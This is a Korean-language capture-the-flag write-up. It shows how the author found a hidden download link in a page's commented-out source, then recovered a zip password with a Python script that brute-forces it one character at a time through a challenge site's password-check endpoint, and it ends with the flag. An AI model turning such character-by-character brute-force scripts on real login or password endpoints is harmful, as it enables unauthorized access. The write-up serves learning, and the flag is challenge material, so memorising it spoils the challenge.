<img src="./open.png">
: 해당 링크로 들어가보니 이와 같은 페이지가 나왔다. 
<img src="./box.png">
: 페이지의 소스에서 주석으로 처리되는 부분을 지워보니 이와 같은 상자 그림이 나왔고, 클릭해보니 다음과 같은 zip파일이 받아졌다.  

```
flag.zip
``` 
: 이 zip 파일 안에는 flag.txt 파일이 압축되어있었고, 이를 풀려면 패스워드가 필요했다. 

<img src="./password.png">
: 다음 페이지는 패스워드를 물어보는 페이지였다. 즉, 이곳에서 알맞은 패스워드를 알아내야한다는 것을 알 수 있었다.

> 즉, `패스워드를 알아내서 압축을 풀고 flag를 알아내는 것`이 이번 문제였다. 

------------------------------
#### 브루트 포스 (Brute Force)
brute : 짐승, 동물  
force : 힘  
=> `가능한 모든 경우`에 대해 모두 `직접` 해 보는 방법

* 만들기가 쉽다.
* 시간면에서 매우 비효율적이다.
------------------------------

파이썬 코드는 다음과 같다.
```
import urllib,requests,time

password=""

for j in range(0,30):
	for i in range(39,127):
		try:
			payload={"no":j,"word":chr(i)}
			headers={"Content-Type":"application/x-www-form-urlencoded"}
			r=requests.post("http://yeali.me/open/password.php",data=payload,headers=headers)
		except:
			print("exception")
			continue
		if "Good" in r.text :
			password=password+chr(i)
			print ("[*] password : "+password)
			break
		time.sleep(0.1)
print ("[*] password :" +password)
```

나온 패스워드로 압축을 풀고 txt 파일을 본 결과, flag는 다음과 같았다.  
```
!_am_fl4G_LOoOoOoOoOoOL
```

> flag : !_am_fl4G_LOoOoOoOoOoOL